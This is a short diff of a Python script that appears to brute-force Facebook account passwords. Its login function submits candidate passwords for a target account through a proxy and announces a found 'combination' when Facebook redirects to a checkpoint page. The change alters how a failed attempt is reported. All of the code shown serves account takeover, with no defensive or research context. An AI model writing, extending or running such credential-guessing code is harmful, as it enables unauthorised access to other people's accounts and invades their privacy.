@@ -122,7 +122,7 @@ def login(target, p, prxy):
     br.form['pass'] = p.strip()
     br.method ='POST'
     so = br.submit().geturl()
-    if "https:/web.facebook.com/login/*" in so: pass
+    if "https:/web.facebook.com/login/*" in so: return 3
     elif "checkpoint" in so:    
         print(orange+'\n \a\a<==================='+'='*len(p.strip())+'==>'+hijau)
         print(' [+] Kombinasi ditemukan!')
